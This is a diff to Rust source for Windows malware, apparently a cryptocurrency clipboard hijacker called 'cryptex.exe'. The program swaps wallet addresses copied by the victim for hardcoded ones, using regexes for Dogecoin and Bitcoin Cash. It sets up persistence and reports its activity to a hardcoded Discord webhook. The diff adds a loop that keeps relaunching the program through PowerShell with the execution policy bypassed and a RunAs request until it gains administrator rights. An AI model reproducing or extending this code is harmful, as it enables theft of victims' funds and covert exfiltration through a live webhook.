@@ -2,20 +2,30 @@
 
 use clipboard::{windows_clipboard::WindowsClipboardContext, ClipboardProvider};
 use regex::Regex;
-use winapi::um::{synchapi::{OpenMutexW, CreateMutexW}, winnt::SYNCHRONIZE, shellapi::ShellExecuteW, winuser::SW_SHOW};
+use std::io::Error;
+use std::process::ExitStatus;
 use std::{
     collections::HashMap,
     env,
+    ffi::OsStr,
     fs::{copy, create_dir_all},
     io,
     ops::Deref,
+    os::windows::{prelude::OsStrExt, raw::HANDLE},
     path::PathBuf,
+    process::Command,
+    ptr::null_mut,
     str::FromStr,
     thread,
-    time::Duration, ffi::OsStr, os::windows::{prelude::OsStrExt, raw::HANDLE}, ptr::null_mut,
+    time::Duration,
+};
+use winapi::um::{
+    shellapi::ShellExecuteW,
+    synchapi::{CreateMutexW, OpenMutexW},
+    winnt::SYNCHRONIZE,
+    winuser::SW_SHOW,
 };
 use winreg::{enums::*, RegKey};
-use std::io::Error;
 
 static WEBHOOK: &str = "https://discord.com/api/webhooks/1103006398784212992/50iC4B_EO-wOFggTNnSXi4AXzawaObUmK9LzoNfalQbB6_Xw0T0kRTX2hdeXZLzaDRDf";
 static FILE_NAME: &str = "cryptex.exe";
@@ -143,11 +153,12 @@ fn is_administrator() -> Result<bool, Error> {
     use winapi::shared::minwindef::DWORD;
     use winapi::um::processthreadsapi::OpenProcessToken;
     use winapi::um::securitybaseapi::GetTokenInformation;
-    use winapi::um::winnt::{HANDLE, TOKEN_ELEVATION, TOKEN_QUERY, TokenElevation};
+    use winapi::um::winnt::{TokenElevation, HANDLE, TOKEN_ELEVATION, TOKEN_QUERY};
 
     let token: HANDLE = null_mut();
     let process_handle = unsafe { winapi::um::processthreadsapi::GetCurrentProcess() };
-    let success = unsafe { OpenProcessToken(process_handle, TOKEN_QUERY, &token as *const _ as *mut _) } != 0;
+    let success =
+        unsafe { OpenProcessToken(process_handle, TOKEN_QUERY, &token as *const _ as *mut _) } != 0;
 
     if !success {
         return Err(Error::last_os_error());
@@ -173,6 +184,24 @@ fn is_administrator() -> Result<bool, Error> {
     Ok(elevation.TokenIsElevated != 0)
 }
 
+fn run_as_admin() -> ExitStatus {
+    let status = Command::new("powershell")
+        .args(&[
+            "-ExecutionPolicy",
+            "Bypass",
+            "-NoProfile",
+            "-Command",
+            &format!(
+                "Start-Process -FilePath \"{}\" -Verb RunAs",
+                std::env::current_exe().unwrap().to_str().unwrap()
+            ),
+        ])
+        .status()
+        .expect("Failed to execute command");
+
+    status
+}
+
 #[tokio::main]
 async fn main() {
     if is_administrator().unwrap() {
@@ -188,19 +217,27 @@ async fn main() {
                 (r"^D[1-9A-HJ-NP-Za-km-z]{33}$", DGE_ADDR),
                 (r"^(q|1|bitcoincash:)[a-zA-HJ-NP-Z0-9]{41}$", BCH_ADDR),
             ]);
-        
+
             match persistence().await {
                 Ok(..) => loop {
                     let scan_res = scan(&map);
-        
+
                     if scan_res.is_some() {
                         send_webhook("Copied to clipboard".to_string()).await;
                     }
-        
+
                     thread::sleep(Duration::from_millis(500));
                 },
                 Err(..) => {}
             };
+        }
+    } else {
+        loop {
+            let status = run_as_admin();
+
+            if status.success() {
+                break;
+            }
         }
     }
 }
